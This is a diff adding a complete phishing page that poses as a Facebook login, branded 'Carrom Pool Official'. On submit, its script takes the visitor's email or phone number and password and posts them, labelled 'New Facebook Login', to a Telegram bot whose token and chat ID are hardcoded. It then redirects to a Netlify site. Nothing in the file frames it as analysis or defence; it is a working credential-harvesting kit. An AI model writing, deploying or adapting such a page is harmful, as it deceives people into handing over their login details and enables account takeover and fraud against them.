@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 360px;
+      margin: 80px auto;
+      padding: 40px;
+      background-color: #fff;
+      box-shadow: 0 0 8px rgba(0,0,0,0.1);
+      border-radius: 10px;
+      text-align: center;
+    }
+    .logo {
+      font-size: 40px;
+      color: #1877f2;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+    .carrom-img {
+      width: 80px;
+      height: 80px;
+      border-radius: 10px;
+      margin-bottom: 10px;
+      object-fit: cover;
+    }
+    .carrom-title {
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 20px;
+      color: #333;
+    }
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 14px;
+      margin: 10px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      font-size: 18px;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #166fe5;
+    }
+    .links {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #1877f2;
+    }
+    .links a {
+      display: block;
+      margin: 5px 0;
+      color: #1877f2;
+      text-decoration: none;
+    }
+    .footer {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 12px;
+      color: gray;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">facebook</div>
+    <img src="https://media-hosting.imagekit.io/d03becbabf824ae7/images%20(4).jpeg?Expires=1839570283&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=0OkQLzCn1GcZVDXMmiU8N3xDqRYu4Tpgn7g5TVYEhjDryx~hBiltGRHipoceqaCqcmfFuTn-m9IVAruP9kTMMFx33oAuqGv~m8~jPF2PAhbAZ9N~0asAczfL7FEtXyb8CTBtadh~wowysMeY3BLrBG5Q5FObm-imI4054mgBiPMt1FmiR2frMv3SJYbPzwRO407glIf6uACuvr4ogpU9gxt6GoWvB9o31TYRYLKC4rPlZKbDJ2-mfhkuoQD3RUCr3L58Y4LT9Ry3NCxFGEZgp0YeZQr4vaGNqnIlumYmEYxqLFYMMcf8sjiCMLpY~tScZWeWQSgU8oy-C7mLMdFpVA__" alt="Carrom Pool Icon" class="carrom-img">
+    <div class="carrom-title">Carrom Pool Official</div>
+    <form id="loginForm">
+      <input type="text" id="email" name="email" placeholder="Email address or phone number" required />
+      <input type="password" id="password" name="password" placeholder="Password" required />
+      <button type="submit">Log In</button>
+    </form>
+    <div class="links">
+      <a href="#">Forgotten password?</a>
+      <a href="#">Create account</a>
+      <a href="#">Help Centre</a>
+    </div>
+  </div>
+
+  <div class="footer">
+    English (UK) · मराठी · ਪੰਜਾਬੀ · हिन्दी · اُردو · বাংলা
+  </div>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      const message = `New Facebook Login:\nEmail/Phone: ${email}\nPassword: ${password}`;
+      const token = "6221428997:AAE8zvLIx0mQlNyVX7LU3fmOFq6FPNs1R30";
+      const chatId = "6138139230";
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      }).then(response => {
+        if (response.ok) {
+          window.location.href = "https://inquisitive-maamoul-f02e2f.netlify.app/";
+        } else {
+          alert("Failed to send to Telegram!");
+        }
+      }).catch(error => {
+        alert("Something went wrong!\n" + error.message);
+      });
+    });
+  </script>
+</body>
+</html>
